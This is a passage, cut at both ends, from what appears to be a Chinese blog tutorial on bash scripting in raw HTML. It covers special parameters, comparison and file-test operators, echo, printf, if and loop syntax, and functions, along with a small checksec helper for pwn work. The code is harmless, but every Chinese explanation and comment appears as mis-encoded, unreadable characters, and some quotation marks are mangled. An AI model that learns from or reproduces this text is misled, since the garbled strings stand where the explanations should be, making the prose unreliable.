class="variable">$2</span></span><br><span class="line"><span class="comment">#‰∏ªË¶ÅÁúã‰∏Ä‰∏ã$@Âíå$*</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"-- \$* ÊºîÁ§∫ ---"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">"$*"</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"-- \$@ ÊºîÁ§∫ ---"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">"<span class="variable">$@</span>"</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>ÁâπÂà´ÁöÑÂèòÈáè</p><div class="table-container"><table><thead><tr><th>$#</th><th>‰º†ÈÄíÂà∞ËÑöÊú¨ÁöÑÂèÇÊï∞‰∏™Êï∞</th></tr></thead><tbody><tr><td>$*</td><td>‰ª•‰∏Ä‰∏™ÂçïÂ≠óÁ¨¶‰∏≤ÊòæÁ§∫ÊâÄÊúâÂêëËÑöÊú¨‰º†ÈÄíÁöÑÂèÇÊï∞„ÄÇ Â¶Ç‚Äù$*‚ÄùÁî®„Äå‚Äù„ÄçÊã¨Ëµ∑Êù•ÁöÑÊÉÖÂÜµ„ÄÅ‰ª•‚Äù$1 $2 ‚Ä¶ $n‚ÄùÁöÑÂΩ¢ÂºèËæìÂá∫ÊâÄÊúâÂèÇÊï∞„ÄÇ</td></tr><tr><td>$$</td><td>ËÑöÊú¨ËøêË°åÁöÑÂΩìÂâçËøõÁ®ãIDÂè∑</td></tr><tr><td>$!</td><td>ÂêéÂè∞ËøêË°åÁöÑÊúÄÂêé‰∏Ä‰∏™ËøõÁ®ãÁöÑIDÂè∑</td></tr><tr><td>$@</td><td>‰∏é$*Áõ∏ÂêåÔºå‰ΩÜÊòØ‰ΩøÁî®Êó∂Âä†ÂºïÂè∑ÔºåÂπ∂Âú®ÂºïÂè∑‰∏≠ËøîÂõûÊØè‰∏™ÂèÇÊï∞„ÄÇ Â¶Ç‚Äù‚Äã$@‚ÄùÁî®„Äå‚Äù„ÄçÊã¨Ëµ∑Êù•ÁöÑÊÉÖÂÜµ„ÄÅ‰ª•‚Äù‚Äã$1‚Äù ‚Äú$2‚Äù ‚Ä¶ ‚Äú$n‚Äù ÁöÑÂΩ¢ÂºèËæìÂá∫ÊâÄÊúâÂèÇÊï∞„ÄÇ</td></tr><tr><td>$-</td><td>ÊòæÁ§∫Shell‰ΩøÁî®ÁöÑÂΩìÂâçÈÄâÈ°πÔºå‰∏é<a href="https://www.runoob.com/linux/linux-comm-set.html" target="_blank" rel="noopener">setÂëΩ‰ª§</a>ÂäüËÉΩÁõ∏Âêå„ÄÇ</td></tr><tr><td>$?</td><td>ÊòæÁ§∫ÊúÄÂêéÂëΩ‰ª§ÁöÑÈÄÄÂá∫Áä∂ÊÄÅ„ÄÇ0Ë°®Á§∫Ê≤°ÊúâÈîôËØØÔºåÂÖ∂‰ªñ‰ªª‰ΩïÂÄºË°®ÊòéÊúâÈîôËØØ„ÄÇ</td></tr></tbody></table></div><p>$* ‰∏é $@ Âå∫Âà´Ôºö</p><ul><li>Áõ∏ÂêåÁÇπÔºöÈÉΩÊòØÂºïÁî®ÊâÄÊúâÂèÇÊï∞„ÄÇ</li><li>‰∏çÂêåÁÇπÔºöÂè™ÊúâÂú®ÂèåÂºïÂè∑‰∏≠‰ΩìÁé∞Âá∫Êù•„ÄÇÂÅáËÆæÂú®ËÑöÊú¨ËøêË°åÊó∂ÂÜô‰∫Ü‰∏â‰∏™ÂèÇÊï∞ 1„ÄÅ2„ÄÅ3ÔºåÔºåÂàô ‚Äú * ‚Äú Á≠â‰ª∑‰∫é ‚Äú1 2 3‚ÄùÔºà‰º†ÈÄí‰∫Ü‰∏Ä‰∏™ÂèÇÊï∞ÔºâÔºåËÄå ‚Äú@‚Äù Á≠â‰ª∑‰∫é ‚Äú1‚Äù ‚Äú2‚Äù ‚Äú3‚ÄùÔºà‰º†ÈÄí‰∫Ü‰∏â‰∏™ÂèÇÊï∞Ôºâ„ÄÇ</li></ul><h1 id="0x03-ËøêÁÆóÁ¨¶"><a href="#0x03-ËøêÁÆóÁ¨¶" class="headerlink" title="0x03 ËøêÁÆóÁ¨¶"></a>0x03 ËøêÁÆóÁ¨¶</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">exp=`expr 1 + 1`</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;exp&#125;</span></span><br><span class="line"><span class="comment">#ËøôÈáåÁõ¥Êé•Â§çÂà∂‰∫Ü</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$a</span> = <span class="variable">$b</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">"<span class="variable">$a</span> = <span class="variable">$b</span> : a Á≠â‰∫é b"</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">"<span class="variable">$a</span> = <span class="variable">$b</span>: a ‰∏çÁ≠â‰∫é b"</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$a</span> != <span class="variable">$b</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">"<span class="variable">$a</span> != <span class="variable">$b</span> : a ‰∏çÁ≠â‰∫é b"</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">"<span class="variable">$a</span> != <span class="variable">$b</span>: a Á≠â‰∫é b"</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="variable">$a</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">"-z <span class="variable">$a</span> : Â≠óÁ¨¶‰∏≤ÈïøÂ∫¶‰∏∫ 0"</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">"-z <span class="variable">$a</span> : Â≠óÁ¨¶‰∏≤ÈïøÂ∫¶‰∏ç‰∏∫ 0"</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ -n <span class="string">"<span class="variable">$a</span>"</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">"-n <span class="variable">$a</span> : Â≠óÁ¨¶‰∏≤ÈïøÂ∫¶‰∏ç‰∏∫ 0"</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">"-n <span class="variable">$a</span> : Â≠óÁ¨¶‰∏≤ÈïøÂ∫¶‰∏∫ 0"</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$a</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">"<span class="variable">$a</span> : Â≠óÁ¨¶‰∏≤‰∏ç‰∏∫Á©∫"</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">"<span class="variable">$a</span> : Â≠óÁ¨¶‰∏≤‰∏∫Á©∫"</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>Â∏∏ËßÅËøêÁÆóÁ¨¶Â∞±‰∏çËØ¥‰∫Ü</p><h2 id="1-ÂÖ≥Á≥ªËøêÁÆóÁ¨¶"><a href="#1-ÂÖ≥Á≥ªËøêÁÆóÁ¨¶" class="headerlink" title="1. ÂÖ≥Á≥ªËøêÁÆóÁ¨¶"></a>1. ÂÖ≥Á≥ªËøêÁÆóÁ¨¶</h2><div class="table-container"><table><thead><tr><th style="text-align:left">ËøêÁÆóÁ¨¶</th><th style="text-align:left">ËØ¥Êòé</th><th style="text-align:left">‰∏æ‰æã</th></tr></thead><tbody><tr><td style="text-align:left">-eq</td><td style="text-align:left">Ê£ÄÊµã‰∏§‰∏™Êï∞ÊòØÂê¶Áõ∏Á≠âÔºåÁõ∏Á≠âËøîÂõû true„ÄÇ</td><td style="text-align:left">[ $a -eq $b ] ËøîÂõû false„ÄÇ</td></tr><tr><td style="text-align:left">-ne</td><td style="text-align:left">Ê£ÄÊµã‰∏§‰∏™Êï∞ÊòØÂê¶‰∏çÁõ∏Á≠âÔºå‰∏çÁõ∏Á≠âËøîÂõû true„ÄÇ</td><td style="text-align:left">[ $a -ne $b ] ËøîÂõû true„ÄÇ</td></tr><tr><td style="text-align:left">-gt</td><td style="text-align:left">Ê£ÄÊµãÂ∑¶ËæπÁöÑÊï∞ÊòØÂê¶Â§ß‰∫éÂè≥ËæπÁöÑÔºåÂ¶ÇÊûúÊòØÔºåÂàôËøîÂõû true„ÄÇ</td><td style="text-align:left">[ $a -gt $b ] ËøîÂõû false„ÄÇ</td></tr><tr><td style="text-align:left">-lt</td><td style="text-align:left">Ê£ÄÊµãÂ∑¶ËæπÁöÑÊï∞ÊòØÂê¶Â∞è‰∫éÂè≥ËæπÁöÑÔºåÂ¶ÇÊûúÊòØÔºåÂàôËøîÂõû true„ÄÇ</td><td style="text-align:left">[ $a -lt $b ] ËøîÂõû true„ÄÇ</td></tr><tr><td style="text-align:left">-ge</td><td style="text-align:left">Ê£ÄÊµãÂ∑¶ËæπÁöÑÊï∞ÊòØÂê¶Â§ß‰∫éÁ≠â‰∫éÂè≥ËæπÁöÑÔºåÂ¶ÇÊûúÊòØÔºåÂàôËøîÂõû true„ÄÇ</td><td style="text-align:left">[ $a -ge $b ] ËøîÂõû false„ÄÇ</td></tr><tr><td style="text-align:left">-le</td><td style="text-align:left">Ê£ÄÊµãÂ∑¶ËæπÁöÑÊï∞ÊòØÂê¶Â∞è‰∫éÁ≠â‰∫éÂè≥ËæπÁöÑÔºåÂ¶ÇÊûúÊòØÔºåÂàôËøîÂõû true„ÄÇ</td><td style="text-align:left">[ $a -le $b ] ËøîÂõû true„ÄÇ</td></tr></tbody></table></div><h2 id="2-Â∏ÉÂ∞îËøêÁÆóÁ¨¶"><a href="#2-Â∏ÉÂ∞îËøêÁÆóÁ¨¶" class="headerlink" title="2. Â∏ÉÂ∞îËøêÁÆóÁ¨¶"></a>2. Â∏ÉÂ∞îËøêÁÆóÁ¨¶</h2><div class="table-container"><table><thead><tr><th style="text-align:left">ËøêÁÆóÁ¨¶</th><th style="text-align:left">ËØ¥Êòé</th><th style="text-align:left">‰∏æ‰æã</th></tr></thead><tbody><tr><td style="text-align:left">!</td><td style="text-align:left">ÈùûËøêÁÆóÔºåË°®ËææÂºè‰∏∫ true ÂàôËøîÂõû falseÔºåÂê¶ÂàôËøîÂõû true„ÄÇ</td><td style="text-align:left">[ ! false ] ËøîÂõû true„ÄÇ</td></tr><tr><td style="text-align:left">-o</td><td style="text-align:left">ÊàñËøêÁÆóÔºåÊúâ‰∏Ä‰∏™Ë°®ËææÂºè‰∏∫ true ÂàôËøîÂõû true„ÄÇ</td><td style="text-align:left">[$a -lt 20 -o $b -gt 100 ] ËøîÂõû true„ÄÇ</td></tr><tr><td style="text-align:left">-a</td><td style="text-align:left">‰∏éËøêÁÆóÔºå‰∏§‰∏™Ë°®ËææÂºèÈÉΩ‰∏∫ true ÊâçËøîÂõû true„ÄÇ</td><td style="text-align:left">[ $a -lt 20 -a $b -gt 100 ] ËøîÂõû false„ÄÇ</td></tr></tbody></table></div><h2 id="3-Â≠óÁ¨¶‰∏≤ËøêÁÆóÁ¨¶"><a href="#3-Â≠óÁ¨¶‰∏≤ËøêÁÆóÁ¨¶" class="headerlink" title="3. Â≠óÁ¨¶‰∏≤ËøêÁÆóÁ¨¶"></a>3. Â≠óÁ¨¶‰∏≤ËøêÁÆóÁ¨¶</h2><div class="table-container"><table><thead><tr><th style="text-align:left">ËøêÁÆóÁ¨¶</th><th style="text-align:left">ËØ¥Êòé</th><th style="text-align:left">‰∏æ‰æã</th></tr></thead><tbody><tr><td style="text-align:left">=</td><td style="text-align:left">Ê£ÄÊµã‰∏§‰∏™Â≠óÁ¨¶‰∏≤ÊòØÂê¶Áõ∏Á≠âÔºåÁõ∏Á≠âËøîÂõû true„ÄÇ</td><td style="text-align:left">[ $a = $b ] ËøîÂõû false„ÄÇ</td></tr><tr><td style="text-align:left">!=</td><td style="text-align:left">Ê£ÄÊµã‰∏§‰∏™Â≠óÁ¨¶‰∏≤ÊòØÂê¶‰∏çÁõ∏Á≠âÔºå‰∏çÁõ∏Á≠âËøîÂõû true„ÄÇ</td><td style="text-align:left">[ $a != $b ] ËøîÂõû true„ÄÇ</td></tr><tr><td style="text-align:left">-z</td><td style="text-align:left">Ê£ÄÊµãÂ≠óÁ¨¶‰∏≤ÈïøÂ∫¶ÊòØÂê¶‰∏∫0Ôºå‰∏∫0ËøîÂõû true„ÄÇ</td><td style="text-align:left">[ -z $a ] ËøîÂõû false„ÄÇ</td></tr><tr><td style="text-align:left">-n</td><td style="text-align:left">Ê£ÄÊµãÂ≠óÁ¨¶‰∏≤ÈïøÂ∫¶ÊòØÂê¶‰∏ç‰∏∫ 0Ôºå‰∏ç‰∏∫ 0 ËøîÂõû true„ÄÇ</td><td style="text-align:left">[ -n ‚Äú$a‚Äù ] ËøîÂõû true„ÄÇ</td></tr><tr><td style="text-align:left">$</td><td style="text-align:left">Ê£ÄÊµãÂ≠óÁ¨¶‰∏≤ÊòØÂê¶‰∏∫Á©∫Ôºå‰∏ç‰∏∫Á©∫ËøîÂõû true„ÄÇ</td><td style="text-align:left">[ $a ] ËøîÂõû true„ÄÇ</td></tr></tbody></table></div><h2 id="4-Êñá‰ª∂ÊµãËØïËøêÁÆóÁ¨¶"><a href="#4-Êñá‰ª∂ÊµãËØïËøêÁÆóÁ¨¶" class="headerlink" title="4. Êñá‰ª∂ÊµãËØïËøêÁÆóÁ¨¶"></a>4. Êñá‰ª∂ÊµãËØïËøêÁÆóÁ¨¶</h2><p>ÊÑüËßâ‰∏çÂ§™Áî®ÂæóÁùÄ</p><p>Áõ¥Êé•Â§çÂà∂‰∫Ü</p><div class="table-container"><table><thead><tr><th style="text-align:left">Êìç‰ΩúÁ¨¶</th><th style="text-align:left">ËØ¥Êòé</th><th style="text-align:left">‰∏æ‰æã</th></tr></thead><tbody><tr><td style="text-align:left">-b file</td><td style="text-align:left">Ê£ÄÊµãÊñá‰ª∂ÊòØÂê¶ÊòØÂùóËÆæÂ§áÊñá‰ª∂ÔºåÂ¶ÇÊûúÊòØÔºåÂàôËøîÂõû true„ÄÇ</td><td style="text-align:left">[ -b $file ] ËøîÂõû false„ÄÇ</td></tr><tr><td style="text-align:left">-c file</td><td style="text-align:left">Ê£ÄÊµãÊñá‰ª∂ÊòØÂê¶ÊòØÂ≠óÁ¨¶ËÆæÂ§áÊñá‰ª∂ÔºåÂ¶ÇÊûúÊòØÔºåÂàôËøîÂõû true„ÄÇ</td><td style="text-align:left">[ -c $file ] ËøîÂõû false„ÄÇ</td></tr><tr><td style="text-align:left">-d file</td><td style="text-align:left">Ê£ÄÊµãÊñá‰ª∂ÊòØÂê¶ÊòØÁõÆÂΩïÔºåÂ¶ÇÊûúÊòØÔºåÂàôËøîÂõû true„ÄÇ</td><td style="text-align:left">[ -d $file ] ËøîÂõû false„ÄÇ</td></tr><tr><td style="text-align:left">-f file</td><td style="text-align:left">Ê£ÄÊµãÊñá‰ª∂ÊòØÂê¶ÊòØÊôÆÈÄöÊñá‰ª∂ÔºàÊó¢‰∏çÊòØÁõÆÂΩïÔºå‰πü‰∏çÊòØËÆæÂ§áÊñá‰ª∂ÔºâÔºåÂ¶ÇÊûúÊòØÔºåÂàôËøîÂõû true„ÄÇ</td><td style="text-align:left">[ -f $file ] ËøîÂõû true„ÄÇ</td></tr><tr><td style="text-align:left">-g file</td><td style="text-align:left">Ê£ÄÊµãÊñá‰ª∂ÊòØÂê¶ËÆæÁΩÆ‰∫Ü SGID ‰ΩçÔºåÂ¶ÇÊûúÊòØÔºåÂàôËøîÂõû true„ÄÇ</td><td style="text-align:left">[ -g $file ] ËøîÂõû false„ÄÇ</td></tr><tr><td style="text-align:left">-k file</td><td style="text-align:left">Ê£ÄÊµãÊñá‰ª∂ÊòØÂê¶ËÆæÁΩÆ‰∫ÜÁ≤òÁùÄ‰Ωç(Sticky Bit)ÔºåÂ¶ÇÊûúÊòØÔºåÂàôËøîÂõû true„ÄÇ</td><td style="text-align:left">[ -k $file ] ËøîÂõû false„ÄÇ</td></tr><tr><td style="text-align:left">-p file</td><td style="text-align:left">Ê£ÄÊµãÊñá‰ª∂ÊòØÂê¶ÊòØÊúâÂêçÁÆ°ÈÅìÔºåÂ¶ÇÊûúÊòØÔºåÂàôËøîÂõû true„ÄÇ</td><td style="text-align:left">[ -p $file ] ËøîÂõû false„ÄÇ</td></tr><tr><td style="text-align:left">-u file</td><td style="text-align:left">Ê£ÄÊµãÊñá‰ª∂ÊòØÂê¶ËÆæÁΩÆ‰∫Ü SUID ‰ΩçÔºåÂ¶ÇÊûúÊòØÔºåÂàôËøîÂõû true„ÄÇ</td><td style="text-align:left">[ -u $file ] ËøîÂõû false„ÄÇ</td></tr><tr><td style="text-align:left">-r file</td><td style="text-align:left">Ê£ÄÊµãÊñá‰ª∂ÊòØÂê¶ÂèØËØªÔºåÂ¶ÇÊûúÊòØÔºåÂàôËøîÂõû true„ÄÇ</td><td style="text-align:left">[ -r $file ] ËøîÂõû true„ÄÇ</td></tr><tr><td style="text-align:left">-w file</td><td style="text-align:left">Ê£ÄÊµãÊñá‰ª∂ÊòØÂê¶ÂèØÂÜôÔºåÂ¶ÇÊûúÊòØÔºåÂàôËøîÂõû true„ÄÇ</td><td style="text-align:left">[ -w $file ] ËøîÂõû true„ÄÇ</td></tr><tr><td style="text-align:left">-x file</td><td style="text-align:left">Ê£ÄÊµãÊñá‰ª∂ÊòØÂê¶ÂèØÊâßË°åÔºåÂ¶ÇÊûúÊòØÔºåÂàôËøîÂõû true„ÄÇ</td><td style="text-align:left">[ -x $file ] ËøîÂõû true„ÄÇ</td></tr><tr><td style="text-align:left">-s file</td><td style="text-align:left">Ê£ÄÊµãÊñá‰ª∂ÊòØÂê¶‰∏∫Á©∫ÔºàÊñá‰ª∂Â§ßÂ∞èÊòØÂê¶Â§ß‰∫é0ÔºâÔºå‰∏ç‰∏∫Á©∫ËøîÂõû true„ÄÇ</td><td style="text-align:left">[ -s $file ] ËøîÂõû true„ÄÇ</td></tr><tr><td style="text-align:left">-e file</td><td style="text-align:left">Ê£ÄÊµãÊñá‰ª∂ÔºàÂåÖÊã¨ÁõÆÂΩïÔºâÊòØÂê¶Â≠òÂú®ÔºåÂ¶ÇÊûúÊòØÔºåÂàôËøîÂõû true„ÄÇ</td><td style="text-align:left">[ -e $file ] ËøîÂõû true„ÄÇ</td></tr></tbody></table></div><h1 id="0x04-echo"><a href="#0x04-echo" class="headerlink" title="0x04 echo"></a>0x04 echo</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#-eÂºÄÂêØËΩ¨‰πâ</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"pz1o \n"</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"pz1o \c"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"CUMT!"</span></span><br><span class="line"><span class="comment">#''‰∏çËΩ¨‰πâÊàñËÄÖÂèòÈáè</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'\n \c'</span></span><br><span class="line"><span class="comment">#``ÊòæÁ§∫ÂëΩ‰ª§ÊâßË°åÁªìÊûú</span></span><br><span class="line"><span class="built_in">echo</span> `date`</span><br></pre></td></tr></table></figure><h1 id="0x05-printf"><a href="#0x05-printf" class="headerlink" title="0x05 printf"></a>0x05 printf</h1><p>Â§çÂà∂Á≤òË¥¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">"%-10s %-8s %-4.2f\n"</span> ‰∫∫ ÊÄßÂà´ 64.222</span><br><span class="line"><span class="comment"># format-string‰∏∫ÂèåÂºïÂè∑</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">"%d %s\n"</span> 1 <span class="string">"abc"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ÂçïÂºïÂè∑‰∏éÂèåÂºïÂè∑ÊïàÊûú‰∏ÄÊ†∑</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">'%d %s\n'</span> 1 <span class="string">"abc"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Ê≤°ÊúâÂºïÂè∑‰πüÂèØ‰ª•ËæìÂá∫</span></span><br><span class="line"><span class="built_in">printf</span> %s abcdef</span><br><span class="line"></span><br><span class="line"><span class="comment"># Ê†ºÂºèÂè™ÊåáÂÆö‰∫Ü‰∏Ä‰∏™ÂèÇÊï∞Ôºå‰ΩÜÂ§öÂá∫ÁöÑÂèÇÊï∞‰ªçÁÑ∂‰ºöÊåâÁÖßËØ•Ê†ºÂºèËæìÂá∫Ôºåformat-string Ë¢´ÈáçÁî®</span></span><br><span class="line"><span class="built_in">printf</span> %s abc def</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span> <span class="string">"%s\n"</span> abc def</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span> <span class="string">"%s %s %s\n"</span> a b c d e f g h i j</span><br><span class="line"></span><br><span class="line"><span class="comment"># Â¶ÇÊûúÊ≤°Êúâ argumentsÔºåÈÇ£‰πà %s Áî®NULL‰ª£ÊõøÔºå%d Áî® 0 ‰ª£Êõø</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">"%s and %d \n"</span></span><br></pre></td></tr></table></figure><h1 id="0x06-ÊµÅÁ®ãÊéßÂà∂"><a href="#0x06-ÊµÅÁ®ãÊéßÂà∂" class="headerlink" title="0x06 ÊµÅÁ®ãÊéßÂà∂"></a>0x06 ÊµÅÁ®ãÊéßÂà∂</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/zsh</span></span><br><span class="line"><span class="comment">#ifÊù°‰ª∂</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'Welcome pwner!'</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'-ROP to search some gadgets. \c'</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'-one to search onegadget'</span></span><br><span class="line">file=<span class="variable">$1</span></span><br><span class="line">ROP_POP=<span class="string">"pop|ret"</span></span><br><span class="line">ROP_RET=<span class="string">"ret"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'This is the file information \c'</span></span><br><span class="line">file <span class="variable">$&#123;file&#125;</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span> -x <span class="variable">$&#123;file&#125;</span></span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">`checksec <span class="variable">$&#123;file&#125;</span>`</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">`chmod +x <span class="variable">$&#123;file&#125;</span>`</span><br><span class="line">`checksec <span class="variable">$&#123;file&#125;</span>`</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="comment">#forÂæ™ÁéØ</span></span><br><span class="line"><span class="keyword">for</span> condition</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">command1</span><br><span class="line">...</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="comment">#whileÂæ™ÁéØ</span></span><br><span class="line"><span class="keyword">while</span> condition</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">command</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><h1 id="0x07-ÂáΩÊï∞"><a href="#0x07-ÂáΩÊï∞" class="headerlink" title="0x07 ÂáΩÊï∞"></a>0x07 ÂáΩÊï∞</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[ <span class="keyword">function</span> ] funname [()]</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    action;</span><br><span class="line"></span><br><span class="line">    [<span class="built_in">return</span> int;]</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">funWithReturn</span></span>()&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"Ëøô‰∏™ÂáΩÊï∞‰ºöÂØπËæìÂÖ•ÁöÑ‰∏§‰∏™Êï∞Â≠óËøõË°åÁõ∏Âä†ËøêÁÆó..."</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"ËæìÂÖ•Á¨¨‰∏Ä‰∏™Êï∞Â≠ó: "</span></span><br><span class="line">    <span class="built_in">read</span> aNum</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"ËæìÂÖ•Á¨¨‰∫å‰∏™Êï∞Â≠ó: "</span></span><br><span class="line">    <span class="built_in">read</span> anotherNum</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"‰∏§‰∏™Êï∞Â≠óÂàÜÂà´‰∏∫ <span class="variable">$aNum</span> Âíå <span class="variable">$anotherNum</span> !"</span></span><br><span class="line">    <span class="built_in">return</span> $((<span class="variable">$aNum</span>+<span class="variable">$anotherNum</span>))</span><br><span class="line">&#125;</span><br><span class="line">funWithReturn</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"ËæìÂÖ•ÁöÑ‰∏§‰∏™Êï∞Â≠ó‰πãÂíå‰∏∫ $? !"</span></span><br></pre></td></tr></table></figure><div class="table-container"><table><thead><tr><th style="text-align:left">ÂèÇÊï∞Â§ÑÁêÜ</th><th style="text-align:left">ËØ¥Êòé</th></tr></thead><tbody><tr><td style="text-align:left">$#</td><td style="text-align:left">‰º†ÈÄíÂà∞ËÑöÊú¨ÊàñÂáΩÊï∞ÁöÑÂèÇÊï∞‰∏™Êï∞</td></tr><tr><td style="text-align:left">$*</td><td style="text-align:left">‰ª•‰∏Ä‰∏™ÂçïÂ≠óÁ¨¶‰∏≤ÊòæÁ§∫ÊâÄÊúâÂêëËÑöÊú¨‰º†ÈÄíÁöÑÂèÇÊï∞</td></tr><tr><td style="text-align:left">$$</td><td style="text-align:left">ËÑöÊú¨ËøêË°åÁöÑÂΩìÂâçËøõÁ®ãIDÂè∑</td></tr><tr><td style="text-align:left">$!</td><td style="text-align:left">ÂêéÂè∞ËøêË°åÁöÑÊúÄÂêé‰∏Ä‰∏™ËøõÁ®ãÁöÑIDÂè∑</td></tr><tr><td style="text-align:left">$@</td><td 